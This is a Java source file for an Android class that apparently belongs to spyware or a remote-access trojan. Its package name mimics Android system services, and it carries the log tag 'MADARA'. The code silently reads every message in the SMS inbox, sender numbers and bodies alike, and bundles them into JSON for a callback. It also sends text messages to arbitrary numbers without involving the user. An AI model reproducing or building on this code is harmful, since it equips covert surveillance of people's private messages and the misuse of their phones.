package com.android.background.services.managers;

import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import android.util.Log;

import com.android.background.services.services.MainService;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class SMSManager {

    private static final String TAG = "MADARA";

    public interface OnRetrievedSMSListener {
        void onRetrievedSMS(JSONObject SMSList);
    }

    public static void getSMSList(OnRetrievedSMSListener listener) {

        new Thread(new Runnable() {
            @Override
            public void run() {

                JSONObject SMSList = new JSONObject();

                try {
                    JSONArray list = new JSONArray();

                    Uri uriSMSURI = Uri.parse("content://sms/inbox");

                    Cursor cursor = MainService.getContextOfApplication().getContentResolver().query(uriSMSURI, null, null, null, null);

                    if (cursor != null) {

                        while (cursor.moveToNext()) {

                            JSONObject sms = new JSONObject();

                            int addressIndex = cursor.getColumnIndex("address");
                            int bodyIndex = cursor.getColumnIndex("body");

                            String address = cursor.getString(addressIndex);
                            String body = cursor.getString(bodyIndex);

                            sms.put("phoneNo", address);
                            sms.put("msg", body);
                            list.put(sms);
                        }

                        cursor.close();
                        SMSList.put("smsList", list);
                    }
                } catch (JSONException e) {
                    Log.e(TAG, "run: ", e);
                }

                listener.onRetrievedSMS(SMSList);
            }
        }).start();
    }

    public static boolean sendSMS(String phoneNo, String msg) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phoneNo, null, msg, null, null);
            return true;
        } catch (Exception ex) {
            Log.e(TAG, "sendSMS: ", ex);
            return false;
        }
    }
}
